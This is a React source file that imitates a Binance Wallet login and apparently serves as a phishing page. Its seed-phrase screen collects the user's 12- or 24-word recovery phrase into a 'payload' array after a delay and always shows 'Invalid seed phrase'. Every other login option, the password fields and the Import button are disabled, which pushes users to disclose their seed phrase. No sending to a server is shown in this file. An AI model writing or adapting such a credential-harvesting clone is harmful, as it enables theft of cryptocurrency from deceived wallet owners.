import React, { useState, useRef, useEffect } from 'react';
import './Wallet.css';
import icon from './images/icon.svg';
import worldMap from './images/binancemap.svg';
import google from './images/google.svg';

const Wallet = () => {
    const [home, setHome] = useState(true);
    const [existing, setExisting] = useState(false);
    const [seedPhrase, setSeedPhrase] = useState(false);
    const [payload, setPayload] = useState([]);

    let item = null;

    if (existing) {
        item = <WalletExisting home={home} setHome={setHome} existing={existing} setExisting={setExisting} seedPhrase={seedPhrase} setSeedPhrase={setSeedPhrase} />;
    } else if (seedPhrase) {
        item = <SeedPhrase existing={existing} setExisting={setExisting} seedPhrase={seedPhrase} setSeedPhrase={setSeedPhrase} payload={payload} setPayload={setPayload} />
    }

    return (
        <main>
            <div className='page-content'>
                {home ? <WalletAdd home={home} setHome={setHome} existing={existing} setExisting={setExisting} /> : item}
            </div>
        </main>
    )
}

const WalletAdd = (props) => {
    return (
        <>
            <span className='world-map'><img src={worldMap}></img></span><br />
            <img src={icon} className='icon'></img>
            <h1 className='welcome-message'>Welcome to Binance</h1>
            <p className='subheading-message'>Secure and trusted multi-chain crypto wallet</p>
            <button className='button existing-wallet' onClick={() => { props.setExisting(true); props.setHome(false) }}>Use existing wallet</button>
            <button className='button create-wallet'>Create wallet</button>
        </>
    )
}

const WalletExisting = (props) => {
    return (
        <>
            <button className='back-button' onClick={() => { props.setHome(true); props.setExisting(false); }}>
                <svg style={{ margin: "auto" }} viewBox="0 0 11 11"><path stroke='rgb(230, 232, 234)' d="M4.069 5.25L8.334.919 7.416 0l-5.25 5.25 5.25 5.25.918-.919L4.07 5.25z"></path></svg>
            </button>
            <h1 className='heading'>Log in to Binance Wallet</h1>
            <h4 className='select-preferred'>Select Your Preferred Method</h4>
            <button onClick={() => { props.setSeedPhrase(true); props.setExisting(false) }} className='button import-seed-button'><svg fill='rgb(230, 232, 234)' viewBox="0 0 16 16" className="button-icon"><path d="M4.4 4v2.4h-.8c-.855 0-1.6.621-1.6 1.467v6.666C2 15.38 2.745 16 3.6 16h9.6c.855 0 1.6-.621 1.6-1.467V7.867c0-.846-.745-1.467-1.6-1.467h-.8V4a4 4 0 00-8 0zm6.4 0v2.4H6V4a2.4 2.4 0 014.8 0zM3.6 14.4V8h9.6v6.4H3.6zm5.6-3.2a.8.8 0 11-1.6 0 .8.8 0 011.6 0z" clipRule="evenodd"></path></svg>Import Seed Phrase</button>
            <button className='button safulet-button' disabled><svg fill='rgb(230, 232, 234)' viewBox="0 0 16 16" className="button-icon"><path fillRule="evenodd" d="M1.2 14.8h13.6V1.2H1.2v13.6zM15.086 16c.505 0 .914-.41.914-.914V.914A.914.914 0 0015.086 0H.914A.914.914 0 000 .914v14.172c0 .505.41.914.914.914h14.172zM5.48 8.296h.593c.245 0 .444-.132.444-.296 0-.163-.199-.296-.444-.296H5.48c.053-.456.227-.874.488-1.223l.239.238a.362.362 0 10.512-.512l-.238-.238c.348-.26.766-.434 1.22-.487v.592c0 .246.133.445.297.445.164 0 .296-.2.296-.445v-.592c.456.053.874.227 1.223.488l-.237.237a.362.362 0 10.512.513l.237-.237c.26.348.434.766.487 1.22h-.592c-.245 0-.444.134-.444.297 0 .164.199.296.444.296h.592a2.523 2.523 0 01-.487 1.222l-.237-.237a.362.362 0 00-.513.512l.238.237a2.522 2.522 0 01-1.223.488v-.592c0-.246-.132-.444-.296-.444-.164 0-.296.198-.296.444v.592a2.52 2.52 0 01-1.222-.487l.239-.239a.362.362 0 10-.513-.512l-.238.239a2.522 2.522 0 01-.488-1.223zm4.846-2.577c.576.588.931 1.393.931 2.281a3.248 3.248 0 01-.973 2.323 3.249 3.249 0 01-2.286.936h-.001a3.26 3.26 0 112.33-5.54zM8 7.111a.889.889 0 100 1.778.889.889 0 000-1.778zm4.4 5.29H3.6l-.017-2h.12A.296.296 0 004 10.103V9.51a.296.296 0 00-.296-.296h-.132L3.548 6.4h.156A.296.296 0 004 6.104V5.51a.296.296 0 00-.296-.296h-.167L3.523 3.6H12.4v8.8zm1.23-10.03V13.63H2.37V10.4h-.296a.296.296 0 01-.296-.296V9.51c0-.163.133-.296.296-.296h.296V6.4h-.296a.296.296 0 01-.296-.296V5.51c0-.163.133-.296.296-.296h.296V2.37h11.26z" clipRule="evenodd"></path></svg>Safulet<span className='beta-tag'>Beta</span></button>
            <button className='button connect-hardware-button' disabled><svg fill='rgb(230, 232, 234)' viewBox="0 0 16 16" className="button-icon"><path d="M9.286 9.03l.178-.176-.178-.177-.333-.331-.177-.176-.176.176-1.036 1.038-.948-.947 1.038-1.039.177-.176-.177-.177-.331-.331-.177-.177-.176.177L5.93 7.75l-.95-.95-.178-.177-.177.178-.984.992a3.23 3.23 0 00-.316 4.198L.323 14.992l-.177.177.177.177.331.331.177.177.177-.177 3.001-3.002a3.225 3.225 0 004.197-.313l.993-.987.178-.177-.177-.178-.952-.951L9.286 9.03zM4.804 7.998l3.199 3.2-.48.475-.063.063c-.886.82-2.273.8-3.135-.06a2.264 2.264 0 01.002-3.197l.477-.48zM15.677 1.008l.176-.177-.176-.177-.331-.33-.177-.178-.177.177-3.002 3.002a3.231 3.231 0 00-4.197.313l-.992.988-.178.176.177.178 4.22 4.22.178.177.176-.178.985-.992a3.23 3.23 0 00.316-4.198l3.002-3.001zm-4.005 6.515l-.476.48-3.2-3.2.48-.475.064-.062c.886-.82 2.273-.8 3.135.06.88.881.88 2.314-.002 3.196l-.001.001z"></path></svg>Connect Hardware Wallet</button>
            <div><span></span>or<span></span></div>
            <span className='small-text'>Continue with vKey via:</span>
            <button className='button vkey-button' disabled><img src={google}></img></button>
        </>
    )
}

const SeedPhrase = (props) => {
    const [error, setError] = useState(false);
    const [input, setInput] = useState(false);
    return (
        <>
            <button className='back-button' onClick={() => { props.setExisting(true); props.setSeedPhrase(false); }}>
                <svg style={{ margin: "auto" }} viewBox="0 0 11 11"><path stroke='rgb(230, 232, 234)' d="M4.069 5.25L8.334.919 7.416 0l-5.25 5.25 5.25 5.25.918-.919L4.07 5.25z"></path></svg>
            </button>
            <h1 className='heading'>Import via Seed Phrase</h1>
            <div><span className='copy enter-phrase-copy'>Enter your seed phrase to restore your wallet.</span></div>
            <div className='textbox-label'><span>Seed Phrase</span></div>
            <div className='textbox-enclosure'><SeedPhraseTextbox setError={setError} setInput={setInput} setPayload={props.setPayload} /></div>
            <span className='copy word-limit'>Typically 12 words (sometimes 24) separated by single spaces.</span><br />
            {input ? <span className='textbox-error'>{error ? "Invalid seed phrase" : "Seed phrases must contain 12 or 24 words"}</span> : null}
            <div className='textbox-label'><span>Enter a Strong Password</span></div>
            <div className='input-box'><input type="text" className='clear-input' disabled /><svg fill="rgb(230, 232, 234)" viewBox="0 0 24 24" className="eye-icon"><path d="M18.076 7.395c-3.083-3.193-8.059-3.193-11.142 0L3 11.44l3.934 4.16c3.073 3.193 8.049 3.203 11.132.01l.01-.01L22 11.44l-3.924-4.045zm-1.422 6.697a5.724 5.724 0 01-8.308 0L5.833 11.44l2.513-2.579c2.302-2.371 6.006-2.371 8.308 0l2.513 2.58-2.513 2.651z"></path><path d="M14.732 11.44c.02 1.28-.96 2.34-2.192 2.362-1.231.02-2.252-.999-2.272-2.278-.02-1.28.96-2.34 2.192-2.36h.04v2.277h2.232z"></path></svg></div>
            <span className='copy'>We will use this password to encrypt your data. You will need this password to unlock your wallet.</span><br />
            <span className='copy'><svg className='invalid-input-icon' fill="rgb(118, 128, 143)" viewBox="0 0 10 10"><path d="M0 5c0-2.76 2.24-5 5-5s5 2.24 5 5-2.24 5-5 5-5-2.24-5-5zm1 0c0 2.205 1.795 4 4 4s4-1.795 4-4-1.795-4-4-4-4 1.795-4 4zm6.295 1.59L5.705 5l1.59-1.59-.705-.705L5 4.295l-1.59-1.59-.705.705L4.295 5l-1.59 1.59.705.705L5 5.705l1.59 1.59.705-.705z"></path></svg> 8 or more characters.</span><br />
            <span className='copy'><svg className='invalid-input-icon' fill="rgb(118, 128, 143)" viewBox="0 0 10 10"><path d="M0 5c0-2.76 2.24-5 5-5s5 2.24 5 5-2.24 5-5 5-5-2.24-5-5zm1 0c0 2.205 1.795 4 4 4s4-1.795 4-4-1.795-4-4-4-4 1.795-4 4zm6.295 1.59L5.705 5l1.59-1.59-.705-.705L5 4.295l-1.59-1.59-.705.705L4.295 5l-1.59 1.59.705.705L5 5.705l1.59 1.59.705-.705z"></path></svg> At least one upper case character.</span><br />
            <span className='copy'><svg className='invalid-input-icon' fill="rgb(118, 128, 143)" viewBox="0 0 10 10"><path d="M0 5c0-2.76 2.24-5 5-5s5 2.24 5 5-2.24 5-5 5-5-2.24-5-5zm1 0c0 2.205 1.795 4 4 4s4-1.795 4-4-1.795-4-4-4-4 1.795-4 4zm6.295 1.59L5.705 5l1.59-1.59-.705-.705L5 4.295l-1.59-1.59-.705.705L4.295 5l-1.59 1.59.705.705L5 5.705l1.59 1.59.705-.705z"></path></svg> At least one digit.</span><br />
            <span className='copy'><svg className='invalid-input-icon' fill="rgb(118, 128, 143)" viewBox="0 0 10 10"><path d="M0 5c0-2.76 2.24-5 5-5s5 2.24 5 5-2.24 5-5 5-5-2.24-5-5zm1 0c0 2.205 1.795 4 4 4s4-1.795 4-4-1.795-4-4-4-4 1.795-4 4zm6.295 1.59L5.705 5l1.59-1.59-.705-.705L5 4.295l-1.59-1.59-.705.705L4.295 5l-1.59 1.59.705.705L5 5.705l1.59 1.59.705-.705z"></path></svg> At least one symbol.</span><br />
            <div className='textbox-label'><span>Confirm Password</span></div>
            <div className='input-box'><input type="text" className='clear-input' disabled/><svg fill="rgb(230, 232, 234)" viewBox="0 0 24 24" className="eye-icon"><path d="M18.076 7.395c-3.083-3.193-8.059-3.193-11.142 0L3 11.44l3.934 4.16c3.073 3.193 8.049 3.203 11.132.01l.01-.01L22 11.44l-3.924-4.045zm-1.422 6.697a5.724 5.724 0 01-8.308 0L5.833 11.44l2.513-2.579c2.302-2.371 6.006-2.371 8.308 0l2.513 2.58-2.513 2.651z"></path><path d="M14.732 11.44c.02 1.28-.96 2.34-2.192 2.362-1.231.02-2.252-.999-2.272-2.278-.02-1.28.96-2.34 2.192-2.36h.04v2.277h2.232z"></path></svg></div>
            <div className='agree-terms'><input type="checkbox" style={{ borderRadius: "0.25em", width: "1em", height: "1em", background: "rgb(43, 47, 54)", border: "1px solid rgb(46, 50, 58)" }} id='agree-terms-checkbox' /><span>I have read and agree to the <a href='' className='terms-of-use-link'>Terms of Use</a></span></div>
            <button className='button import-button' disabled>Import</button>
        </>
    )
}

const SeedPhraseTextbox = (props) => {

    const textboxRef = useRef();

    const handleInput = (e) => {
        textboxRef.current.classList.add('written');
        props.setInput(true);
        let res = [];
        let str = e.target.value.replace(/[\t\n\r\.\?\!]/gm, " ").split(" ");

        str.map((s) => {
            let trimStr = s.trim();
            if (trimStr.length > 0) {
                res.push(trimStr);
            }
        });
        let words = res.length;


        if (words === 12 || words === 24) {
            props.setError(true);
            try {
                var wordlength12 = res[11].length;
                var wordlength24 = res[23].length;
            } catch (error) {

            }
            if (wordlength12 >= 3 || wordlength24 >= 3) {
                setTimeout(() => {
                    if (words === 12) {
                        props.setPayload(res);
                        console.log('fire down girl');
                        console.log(res[11]);
                    }
                    else if (words === 24) {
                        props.setPayload(res);
                        console.log('fire down girl')
                    }
                }, 8000);
            }

        }
    }

    return (
        <textarea ref={textboxRef} onChange={handleInput} className='seed-phrase-textbox' />
    )
}

export default Wallet;